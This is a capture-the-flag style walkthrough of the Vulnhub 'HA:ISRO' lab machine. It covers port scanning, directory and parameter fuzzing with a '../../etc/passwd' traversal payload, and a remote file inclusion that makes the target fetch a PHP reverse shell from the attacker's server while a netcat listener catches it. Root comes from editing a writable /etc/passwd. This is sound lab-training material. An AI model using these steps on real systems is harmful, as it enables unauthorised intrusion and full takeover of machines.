# HA:ISRO ~Vulnhub Walkthrough


Here is a walk through for ISRO Vulnhub Machine. It was created by Hacking Articles to give tribute to the Indian Space Research Organisation (ISRO).

Download link -[https://download.vulnhub.com/ha/isro.zip](https://download.vulnhub.com/ha/isro.zip)

## Scanning

nmap -p- 192.168.122.151

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled.png)

nmap -sV -A 192.168.122.151 

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%201.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%201.png)

nmap -sV -A -p65534 192.168.122.151 

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%202.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%202.png)

## Enumeration

Running nikto 

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%203.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%203.png)

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%204.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%204.png)

dirb [http://192.168.122.151/](http://192.168.122.151/) -X .php,.html

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%205.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%205.png)

Found file connect.php

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%206.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%206.png)

Finding parameter

wfuzz -w /usr/share/wordlists/dirb/common.txt --hl 0 [http://192.168.122.151/connect.php](http://192.168.122.151/connect.php)?FUZZ=../../../../../../etc/passwd

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%207.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%207.png)

Found parameter **file**

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%208.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%208.png)

## Exploitation

File parameter is vulnerable to RFI

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%209.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%209.png)

start python server on your machine and open php-reverse-shell.php file in browser using rfi vulnerability. 

Attacker  - python3 -m http.server 5000

192.168.122.1451/connect.php?file=http://192.168.122.148:5000/php-reverse-shell.php

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2010.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2010.png)

Side by side start netcat listener to take reverse shell

nc -nlvp 1234

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2011.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2011.png)

## Privilege escalation

Checking permissions of /etc/passwd

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2012.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2012.png)

/etc/passwd file is writeble

Edit passwd file and change password for root user.

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2013.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2013.png)

su - root

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2014.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2014.png)

***Got root shell.

![HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2015.png](HA%20ISRO%20~Vulnhub%20Walkthrough%209fc3427ec243459bbf989c0f4b1ed46f/Untitled%2015.png)
